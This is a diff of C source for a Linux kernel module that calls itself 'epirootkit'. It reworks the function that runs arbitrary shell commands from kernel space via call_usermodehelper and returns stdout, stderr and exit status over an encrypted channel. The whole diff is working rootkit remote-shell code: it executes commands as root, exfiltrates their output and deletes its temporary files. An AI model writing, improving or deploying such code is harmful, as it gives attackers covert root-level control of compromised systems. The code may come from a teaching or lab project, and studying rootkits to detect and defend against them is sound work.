@@ -83,61 +83,90 @@ static int execute_and_stream_output(const char *cmd) {
     char full_cmd[1024];
     snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2> %s; echo $? > %s", cmd, tmp_stdout, tmp_stderr, tmp_status);
 
+    // Execute the command
+    char *argv[] = {"/bin/sh", "-c", full_cmd, NULL};
     mm_segment_t old_fs = get_fs();
     set_fs(KERNEL_DS);
-    call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", full_cmd, NULL}, NULL, UMH_WAIT_PROC);
+    int ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
     set_fs(old_fs);
 
-    struct file *f;
-    loff_t pos = 0;
-    char buf[256];
+    if (ret != 0) {
+        printk(KERN_WARNING "epirootkit: Command execution failed: %d\n", ret);
+        send_encrypted_section("Command execution failed");
+        send_encrypted_section(SEP_STDERR);
+        send_encrypted_section("Error executing command");
+        send_encrypted_section(SEP_STATUS);
+        send_encrypted_section("-1");
+        send_encrypted_section(EOF_MARKER);
+        return ret;
+    }
 
-    pos = 0;
+    struct file *f;
+    loff_t pos;
+    char buf[256];
+    int bytes_read;
+
+    // Read and send stdout
     f = filp_open(tmp_stdout, O_RDONLY, 0);
     if (!IS_ERR(f)) {
-        while (1) {
+        pos = 0;
+        do {
             memset(buf, 0, sizeof(buf));
-            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
-            if (r <= 0) break;
-            buf[r] = '\0';
-            send_encrypted_section(buf);
-        }
+            bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
+            if (bytes_read > 0) {
+                buf[bytes_read] = '\0';
+                send_encrypted_section(buf);
+            }
+        } while (bytes_read > 0);
         filp_close(f, NULL);
     }
+
+    // Send stderr marker
     send_encrypted_section(SEP_STDERR);
 
-    pos = 0;
+    // Read and send stderr
     f = filp_open(tmp_stderr, O_RDONLY, 0);
     if (!IS_ERR(f)) {
-        while (1) {
+        pos = 0;
+        do {
             memset(buf, 0, sizeof(buf));
-            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
-            if (r <= 0) break;
-            buf[r] = '\0';
-            send_encrypted_section(buf);
-        }
+            bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
+            if (bytes_read > 0) {
+                buf[bytes_read] = '\0';
+                send_encrypted_section(buf);
+            }
+        } while (bytes_read > 0);
         filp_close(f, NULL);
     }
+
+    // Send status marker
     send_encrypted_section(SEP_STATUS);
 
-    pos = 0;
+    // Read and send status
     f = filp_open(tmp_status, O_RDONLY, 0);
     if (!IS_ERR(f)) {
+        pos = 0;
         memset(buf, 0, sizeof(buf));
-        kernel_read(f, buf, sizeof(buf) - 1, &pos);
-        buf[strcspn(buf, "\n")] = 0;
-        send_encrypted_section(buf);
+        bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
+        if (bytes_read > 0) {
+            buf[bytes_read] = '\0';
+            buf[strcspn(buf, "\n")] = 0;
+            send_encrypted_section(buf);
+        } else {
+            send_encrypted_section("-1");
+        }
         filp_close(f, NULL);
     } else {
-        // If we can't read the status file, send failure status
         send_encrypted_section("-1");
     }
 
     // Clean up temporary files
+    old_fs = get_fs();
     set_fs(KERNEL_DS);
     call_usermodehelper("/bin/rm", (char *[]){"/bin/rm", "-f", tmp_stdout, tmp_stderr, tmp_status, NULL}, NULL, UMH_WAIT_PROC);
     set_fs(old_fs);
 
+    // Send EOF marker
     send_encrypted_section(EOF_MARKER);
     return 0;
 }
